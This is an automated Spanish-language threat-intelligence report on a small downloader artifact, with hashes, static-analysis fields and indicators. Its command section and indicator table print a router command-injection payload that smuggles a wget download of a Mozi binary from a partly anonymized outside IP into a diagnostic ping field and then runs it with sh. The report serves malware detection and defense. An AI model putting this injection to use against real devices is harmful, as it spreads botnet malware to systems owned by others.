# 🧬 Payload Analysis

`71c172dc779a3100672939feeeae29c9f6c030fcfc62a465e5f1fbed0e7fc51b`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 138 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://27.215.47.XXX:58445/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:29:35.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `71c172dc779a3100672939feeeae29c9f6c030fcfc62a465e5f1fbed0e7fc51b`
- **SHA1:** `ffc9b7e6aae59a27ece61238fc92b3c5b1275a73`
- **MD5:** `968d9b37bc4e3424eb73301ba2483845`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.1 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://27.215.47.XXX:58445/Mozi.m+-O+- | strings |
| ip | 27.215.47.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 71c172dc779a3100672939feeeae29c9f6c030fcfc62a465e5f1fbed0e7fc51b | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
